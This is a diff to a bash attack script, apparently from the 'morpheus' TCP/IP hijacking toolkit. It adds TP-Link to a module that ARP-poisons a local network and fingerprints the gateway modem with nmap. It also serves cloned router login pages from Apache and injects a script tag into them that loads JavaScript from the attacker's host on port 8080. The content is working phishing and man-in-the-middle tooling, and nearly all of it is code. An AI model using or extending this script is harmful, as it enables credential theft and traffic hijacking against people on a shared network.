@@ -1721,17 +1721,15 @@ echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
-# chose what phishing webpage to use
-PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" --width 300 --height 220) > /dev/null 2>&1
-
 
 
   # retrieve info about modem to inject into clone
   echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
   nmap -sV -PN -p 80 $GaTe -oN $IPATH/output/retrieve.log | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Gather modem ip addr, mac addr and hostname .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1
 
+
   # InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | awk {'print $4,$5,$6'}`
-  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1` # it does not grep all servernames :(
+  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1 | awk {'print $1,$2,$3'}` # grab modem name
   MaCa=`cat $IPATH/output/retrieve.log | egrep -m 1 "MAC" | awk {'print $3'}` # grab mac address ..
   # check if nmap have retrieved any string from scan
   if [ -z "$InjE" ]; then
@@ -1740,6 +1738,10 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
   InjE="broadband router"
   MaCa="8A:17:62:35:22:UA"
   fi
+
+
+# chose what phishing webpage to use
+PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem Info:\n$InjE\n\nChose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" FALSE "TPLink" --width 350 --height 290) > /dev/null 2>&1
 
 
   # building cloned login modem webpage
@@ -1754,9 +1756,15 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
   if [ "$PHiS" = "DLink" ]; then
     cp -r DLINK $ApachE/DLINK > /dev/null 2>&1
   fi
+  # chose 4 phishing webpage to use
+  if [ "$PHiS" = "TPLink" ]; then
+    cp -r TPLink $ApachE/TPLink > /dev/null 2>&1
+  fi
+
 
   # grab modem ip addr
-  MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
+  #MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
+  MIP="www.google.im"
   # chose 2º phishing webpage to use
   if [ "$PHiS" = "Meo" ]; then
     sed -i "s/MoDemIP/$MIP/" new.html
@@ -1764,6 +1772,8 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
     sed -i "s/MoDemIP/$MIP/" login.html
   elif [ "$PHiS" = "Default" ]; then
     sed -i "s/MoDemIP/$MIP/" login.html
+  elif [ "$PHiS" = "TPLink" ]; then
+    :
   else
     sed -i "s/MoDemIP/$MIP/" login.html
   fi
@@ -1775,6 +1785,10 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" new.html > copy.html
   elif [ "$PHiS" = "DLink" ]; then
     cd DLINK
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
+    cd ..
+  elif [ "$PHiS" = "TPLink" ]; then
+    cd TPLink
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
     cd ..
   else
@@ -1844,6 +1858,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   rm $ApachE/login.html > /dev/null 2>&1
   rm -r $ApachE/router-modem > /dev/null 2>&1
   rm -r $ApachE/DLINK > /dev/null 2>&1
+  rm -r $ApachE/TPLink > /dev/null 2>&1
   # rm -r $IPATH/output/clone > /dev/null 2>&1
   cd $IPATH
 
